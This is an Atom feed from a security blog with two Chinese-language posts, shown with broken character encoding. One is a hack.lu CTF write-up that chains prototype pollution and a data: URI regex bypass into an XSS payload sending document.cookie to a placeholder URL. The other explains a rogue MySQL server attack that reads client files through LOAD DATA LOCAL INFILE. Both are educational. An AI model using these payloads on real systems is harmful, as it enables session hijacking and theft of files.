<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcark</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lcark.github.io/"/>
  <updated>2019-10-27T03:56:29.048Z</updated>
  <id>https://lcark.github.io/</id>
  
  <author>
    <name>Lcark</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hack.lu ctf-Car Repair Shop(xss, prototype pollution, bypass) </title>
    <link href="https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/"/>
    <id>https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/</id>
    <published>2019-10-26T15:57:00.000Z</published>
    <updated>2019-10-27T03:56:29.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>â€œYour Car broke down?! Come to our shop, we repair all cars! Even very old ones.â€ <a href="https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>ç‚¹å¼€é¢˜ç›®ï¼Œå³ä¸‹è§’æœ‰ä¸ªæ˜æ˜¾çš„é“¾æ¥<figure class="highlight plain"><figcaption><span>your cookie```, æ˜¯ä¸€ä¸ªæäº¤é“¾æ¥çš„ç•Œé¢</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![upload successful](/images/pasted-0.png)</span><br><span class="line"></span><br><span class="line">æ˜¾ç„¶æ˜¯dom-based xss&lt;br&gt;</span><br><span class="line">ä»¥ä¸‹æ˜¯å…³é”®ä»£ç &lt;br&gt;</span><br><span class="line">car.class.js</span><br><span class="line">```js</span><br><span class="line">class Car &#123;</span><br><span class="line"> â€¦â€¦</span><br><span class="line">    repair() &#123;</span><br><span class="line">        if(urlParams.has(&apos;repair&apos;)) &#123;</span><br><span class="line">            $.extend(true, this, JSON.parse(urlParams.get(&apos;repair&apos;)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ignition() &#123;</span><br><span class="line">        if (this.key == &quot;&quot;) &#123;</span><br><span class="line">            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)</span><br><span class="line">        &#125;</span><br><span class="line">        if (this.key == &quot;ğŸ”‘&quot;) &#123;</span><br><span class="line">            infobox(`The car started!`)</span><br><span class="line">            this.start()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>util.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Bugatti'</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Porsche'</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦é€šè¿‡<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. ç»•è¿‡ key == &quot;ğŸ”‘&quot;æ¥å¯åŠ¨ ```bugatti</span><br></pre></td></tr></table></figure></p><ol start="2"><li>ç»•è¿‡ $.md5(porsche) == â€˜9cdfb439c7876e703e307864c9167a15â€™æ¥æ‰§è¡Œ<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">3. ç»•è¿‡```repairWithHelper```å‡½æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰§è¡Œjs&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¦è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å‘ç°äº†å¦‚ä¸‹ä»£ç ï¼š</span><br><span class="line">```js</span><br><span class="line">repair() &#123;</span><br><span class="line">    if(urlParams.has(&apos;repair&apos;)) &#123;</span><br><span class="line">        $.extend(true, this, JSON.parse(urlParams.get(&apos;repair&apos;)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>è¿™æ˜¯<code>jQuery</code>å®˜æ–¹å¯¹<code>extend</code>å‡½æ•°çš„å®šä¹‰ï¼š<br><img src="/images/pasted-1.png" alt="upload successful"><br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨<code>url</code>ä¸­æ·»åŠ <code>repair</code>å‚æ•°æ¥è§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜:<br><code>https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;}#BugattiPorsche</code></p><p>ç¬¬äºŒä¸ªé—®é¢˜ä¼¼ä¹å°±æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæˆ‘ä»¬è¦ä½¿<code>porsche</code>çš„md5ä¸º<code>9cdfb439c7876e703e307864c9167a15</code>,å®é™…ä¸Šå°±æ˜¯<code>lol</code>çš„md5å€¼ï¼Œæˆ‘ä»¬ä¸å¦¨ç›´æ¥è®¡ç®—<code>porsche</code>çš„md5</p><p><img src="/images/pasted-2.png" alt="upload successful"><br>å‘ç°å…¶md5ä¸º<code>[object Object]</code>çš„md5ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br>å®é™…ä¸Šè°ƒç”¨md5å‡½æ•°ä¹‹å‰ä¼šè°ƒç”¨<code>toString</code>æ–¹æ³•ï¼Œè€Œ<code>porsche</code>åˆç»§æ‰¿äº<code>Object</code>ç±»ï¼Œæˆ‘ä»¬ä¸å¦¨æ”¹å†™æ­¤æ–¹æ³•<br><img src="/images/pasted-3.png" alt="upload successful"><br>å’Œæˆ‘ä»¬æ–™æƒ³çš„ä¸€æ¨¡ä¸€æ ·ï¼Œå› æ­¤å¯ä»¥æ”¹å†™<code>porsche</code>çš„<code>toString</code>æ–¹æ³•æ¥ç»•è¿‡ï¼Œç„¶è€Œ<code>JSON.parse</code>å¹¶ä¸æ”¯æŒæ–¹æ³•çš„è§£æï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ<br>æˆ‘ä»¬å°±ä¸å¾—ä¸äº†è§£ä¸€ä¸‹jsä¸­çš„<code>prototype</code>ï¼Œä»€ä¹ˆæ˜¯åŸå‹å‘¢ï¼Ÿ<br>å¼•ç”¨ã€ŠJavaScriptæƒå¨æŒ‡å—ã€‹çš„ä¸€æ®µæè¿°ï¼š</p><blockquote><p>Every JavaScript object has a second JavaScript object (or null ,but this is rare) associated with it. This second object is known as a prototype, and the first object inherits properties from the prototype.</p></blockquote><p>æ„æ€å°±æ˜¯åŸºæœ¬ä¸Šæ¯ä¸ªjså¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç¬¬äºŒå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯åŸå‹ï¼Œç¬¬ä¸€å¯¹è±¡çš„æ‰€æœ‰å±æ€§éƒ½ç»§æ‰¿äºåŸå‹ã€‚</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå®ƒé¦–å…ˆä¼šä»å½“å‰å¯¹è±¡æ‰€å®šä¹‰çš„å±æ€§å’Œå¯¹è±¡å¯»æ‰¾ï¼Œè‹¥æ˜¯æ²¡æœ‰ï¼Œåˆ™ä»æ‰€ç»§æ‰¿çš„å¯¹è±¡å¯»æ‰¾å³ä»<code>__proto__</code>å¯»æ‰¾ï¼Œè‹¥è¿˜æ˜¯æ²¡æœ‰ï¼Œåˆ™ç»§ç»­ä»<code>__proto__.proto__</code>å¯»æ‰¾ï¼Œç›´è‡³æœ€åã€‚ç®€è€Œè¨€ä¹‹ï¼Œ<code>__proto__</code>æ‰€ä»£è¡¨çš„å°±æ˜¯æ‰€ç»§æ‰¿å¯¹è±¡çš„åŸå‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™ä¸ª<code>__proto__</code>æ¥è¾¾åˆ°ä¿®æ”¹çˆ¶ç±»å±æ€§æˆ–æ–¹æ³•çš„ç›®çš„ï¼Œç”šè‡³ç›´æ¥ä¿®æ”¹å®ƒçš„çˆ¶ç±»ã€‚</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>é‚£ä¹ˆç¬¬äºŒä¸ªé—®é¢˜å°±è¿åˆƒè€Œè§£ï¼Œæˆ‘ä»¬å°†<code>porsche</code>çš„çˆ¶ç±»çš„çˆ¶ç±»æ”¹ä¸º<code>[&#39;lol&#39;]</code>ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨<code>toString</code>è¿”å›<code>lol</code>æ¥ç»•è¿‡<code>md5</code>æ£€æµ‹ã€‚</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p><code>payload: repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦ç»•è¿‡<br><br><code>/^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;</code>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™ä¸ªæˆ‘ä»¬ç”¨<code>data</code>åè®®ç»•è¿‡å³å¯ï¼š<br><br><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>OKï¼ä»¥ä¸‹æ˜¯å®Œæ•´payload<br><code>https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/,$.get(&#39;[your-url]&#39;+document.cookie)//.js#Bugatti%20Porsche</code></p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><ol><li>ä½¿ç”¨extendç»•è¿‡keyçš„æ£€æµ‹</li><li>æ›¿æ¢<code>porsche</code>çš„çˆ¶ç±»æ¥ç»•è¿‡md5</li><li>ä½¿ç”¨dataåè®®ç»•è¿‡srcçš„æ­£åˆ™è¡¨è¾¾å¼</li></ol><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><ol><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æè¿°&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;/a&gt;é¢˜ç›®æè¿°&lt;/h2&gt;&lt;p&gt;â€œYour Car broke down?! Come to our shop, we repair all cars! Even very old ones.â€ &lt;a href=&quot;https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ä¼ é€é—¨&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®åˆ†æ&quot;&gt;&lt;/a&gt;é¢˜ç›®åˆ†æ&lt;/h2&gt;&lt;p&gt;ç‚¹å¼€é¢˜ç›®ï¼Œå³ä¸‹è§’æœ‰ä¸ªæ˜æ˜¾çš„é“¾æ¥&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;your cookie```, æ˜¯ä¸€ä¸ªæäº¤é“¾æ¥çš„ç•Œé¢&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;![upload successful](/images/pasted-0.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;æ˜¾ç„¶æ˜¯dom-based xss&amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ä»¥ä¸‹æ˜¯å…³é”®ä»£ç &amp;lt;br&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;car.class.js&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;```js&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;class Car &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	 â€¦â€¦&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    repair() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if(urlParams.has(&amp;apos;repair&amp;apos;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $.extend(true, this, JSON.parse(urlParams.get(&amp;apos;repair&amp;apos;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ignition() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (this.key == &amp;quot;&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (this.key == &amp;quot;ğŸ”‘&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            infobox(`The car started!`)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            this.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="ctf" scheme="https://lcark.github.io/tags/ctf/"/>
    
      <category term="xss" scheme="https://lcark.github.io/tags/xss/"/>
    
      <category term="prototype pollution" scheme="https://lcark.github.io/tags/prototype-pollution/"/>
    
  </entry>
  
  <entry>
    <title>MysqlClientAttack</title>
    <link href="https://lcark.github.io/2019/09/24/tags/"/>
    <id>https://lcark.github.io/2019/09/24/tags/</id>
    <published>2019-09-24T13:06:00.000Z</published>
    <updated>2019-10-12T09:02:46.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="#æ¼æ´åˆ†æ"></a>#æ¼æ´åˆ†æ</h2><p>åœ¨mysqlä¸­å¯ä»¥é€šè¿‡<code>load data local infile &quot;/var/lib/mysql-files/test.txt&quot; into table test</code>å‘½ä»¤ï¼Œå°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³MySQLæœåŠ¡å™¨ï¼Œå®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¯ä»¥ç›´æ¥å‘å‡ºè¯·æ±‚æ¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦ç»è¿‡ç”¨æˆ·åŒæ„ã€‚</p><a id="more"></a><h2 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h2><p>å®¢æˆ·ç«¯å‘å‡ºå‘½ä»¤è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223700-eef63dc0-dfa1-1.png" alt="image.png"><br>æœåŠ¡ç«¯å‘å‡ºè¯»å–æ–‡ä»¶è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223739-064eca3c-dfa2-1.png" alt="image.png"><br>å®¢æˆ·ç«¯å‘é€æ–‡ä»¶<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223903-381ed7fa-dfa2-1.png" alt="image.png"><br>è‹¥æ˜¯æœåŠ¡ç«¯ç›´æ¥å‘å‡ºè¯»å–æ–‡ä»¶è¯·æ±‚ï¼Œå®¢æˆ·ç«¯ä¾¿ä¼šç›´æ¥å‘é€æœ¬åœ°æ–‡ä»¶ã€‚</p><h1 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h1><hr><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨<br>æœåŠ¡å™¨å‘é€GreetingåŒ…ï¼Œè¦æ±‚å®¢æˆ·ç«¯æä¾›å¯†ç <br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224231-b40f5178-dfa2-1.png" alt="image.png"><br>å®¢æˆ·ç«¯å‘é€ç™»é™†è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224419-f4effe22-dfa2-1.png" alt="image.png"><br>æœåŠ¡ç«¯ç›´æ¥å‘å‡ºokï¼Œç„¶åæœåŠ¡ç«¯ç›´æ¥å‘å‡ºè¯»å–æ–‡ä»¶è¯·æ±‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224712-5ba065da-dfa3-1.png" alt="image.png"><br>å®¢æˆ·ç«¯ä¾¿ä¼šç›´æ¥å‘é€æœ¬åœ°æ–‡ä»¶ã€‚<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224744-6ee9ec1a-dfa3-1.png" alt="image.png"></p><h1 id="æ”»å‡»æ€»è§ˆ"><a href="#æ”»å‡»æ€»è§ˆ" class="headerlink" title="æ”»å‡»æ€»è§ˆ"></a>æ”»å‡»æ€»è§ˆ</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225550-908cd930-dfa4-1.png" alt="image.png"><br>æ³¨æ„ä¸­é—´çš„query requestæ˜¯æ¯æ¬¡ç™»é™†æˆåŠŸçš„ç‰ˆæœ¬å·æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¹¶æœªå“åº”<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225737-d06485e4-dfa4-1.png" alt="image.png"></p><h1 id="è‡ªåŠ¨åŒ–å·¥å…·"><a href="#è‡ªåŠ¨åŒ–å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–å·¥å…·"></a>è‡ªåŠ¨åŒ–å·¥å…·</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225915-0aaf8730-dfa5-1.png" alt="image.png"><br>è¯¦è§ <a href="https://github.com/lcark/MysqlClientAttack/" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack/</a></p><h1 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h1><hr><p>è¿è¡Œè„šæœ¬ï¼Œç›‘å¬æœ¬åœ°ç«¯å£<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162007-1ca83a22-e35b-1.png" alt="image.png"><br>å®¢æˆ·ç«¯è¿æ¥<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162037-2eb0676c-e35b-1.png" alt="image.png"><br>ä¸€æœ‰è¿æ¥ï¼Œå³å¯è¯»å–åˆ°å®¢æˆ·ç«¯æ–‡ä»¶</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162117-463b20de-e35b-1.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#æ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;#æ¼æ´åˆ†æ&quot;&gt;&lt;/a&gt;#æ¼æ´åˆ†æ&lt;/h2&gt;&lt;p&gt;åœ¨mysqlä¸­å¯ä»¥é€šè¿‡&lt;code&gt;load data local infile &amp;quot;/var/lib/mysql-files/test.txt&amp;quot; into table test&lt;/code&gt;å‘½ä»¤ï¼Œå°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³MySQLæœåŠ¡å™¨ï¼Œå®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¯ä»¥ç›´æ¥å‘å‡ºè¯·æ±‚æ¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦ç»è¿‡ç”¨æˆ·åŒæ„ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="mysql" scheme="https://lcark.github.io/tags/mysql/"/>
    
      <category term="web" scheme="https://lcark.github.io/tags/web/"/>
    
      <category term="client" scheme="https://lcark.github.io/tags/client/"/>
    
  </entry>
  
</feed>
